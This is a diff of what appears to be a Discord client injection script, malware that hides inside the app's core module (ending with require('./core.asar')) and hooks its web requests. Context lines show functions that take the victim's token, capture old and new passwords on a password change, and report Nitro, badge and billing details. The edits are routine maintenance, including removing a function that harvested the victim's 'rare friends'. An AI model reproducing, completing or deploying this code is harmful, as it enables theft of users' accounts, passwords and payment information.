@@ -569,13 +569,13 @@ const buyNitro = async (token) => {
 const getNitro = r => {
   switch (r.premium_type) {
       default:
-          return ":x:"
+          return ":x:";
       case 1:
-          return "<:nitro:1232017139461001320>"
+          return "<:nitro:1232017139461001320>";
       case 2:
-          if (!r.premium_guild_since) return "<:nitro:1232017139461001320>"
-          var now = new Date(Date.now())
-          var arr = ["<:boost1:1232102555354665082>", "<:boost2:1232102556537192511>", "<:boost4:1232102559041323030>", "<:boost5:1232102560492687390>", "<:boost6:1232102549923041352>", "<:boost7:1232102551214882836>", "<:boost8:1232102552569643048>", "<:boost9:1232102554066878544>"]
+          if (!r.premium_guild_since) return "<:nitro:1232017139461001320>";
+          var now = new Date(Date.now());
+          var arr = ["<:boost1:1232102555354665082>", "<:boost2:1232102556537192511>", "<:boost4:1232102559041323030>", "<:boost5:1232102560492687390>", "<:boost6:1232102549923041352>", "<:boost7:1232102551214882836>", "<:boost8:1232102552569643048>", "<:boost9:1232102554066878544>"];
           var a = [new Date(r.premium_guild_since), new Date(r.premium_guild_since), new Date(r.premium_guild_since), new Date(r.premium_guild_since), new Date(r.premium_guild_since), new Date(r.premium_guild_since), new Date(r.premium_guild_since)]
           var b = [2, 3, 6, 9, 12, 15, 18, 24]
           var r = []
@@ -599,20 +599,6 @@ const badgeEmojis = {
   4194304: '<:activedev:1232102658782007307>',
   256: '<:balance:1232102660447146126>',
 };
-
-const parseFriends = friends => {
-  var real = friends.filter(x => x.type == 1)
-  var rareFriends = ""
-  for (var friend of real) {
-      var badges = badgeEmojis(friend.user.public_flags)
-      if (badges !== ":x:") rareFriends += `${badges} ${friend.user.username}#${friend.user.discriminator}\n`
-  }
-  if (!rareFriends) rareFriends = "No Rare Friends"
-  return {
-      len: real.length,
-      badges: rareFriends
-  }
-}
 
 const getBadges = (flags) => {
   let badges = '';
@@ -716,7 +702,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
           },
           {
             name: '**Discord Information**',
-            value: `<:025:1232016453805412474> Nitro Type: **${nitro}**\n<a:lovestl:1232020347705102427> Badges: **${badges}**\n<a:cl_creditcard:1232017137175105587> Billing: **${billing}**`,
+            value: `<:025:1232016453805412474> Nitro Type: ${nitro}\n<a:lovestl:1232020347705102427> Badges: **${badges}**\n<a:cl_creditcard:1232017137175105587> Billing: **${billing}**`,
             inline: true,
           },
           {
@@ -996,4 +982,5 @@ session.defaultSession.webRequest.onCompleted(config.filter, async (details, _) 
       break;
   }
 });
+
 module.exports = require('./core.asar');
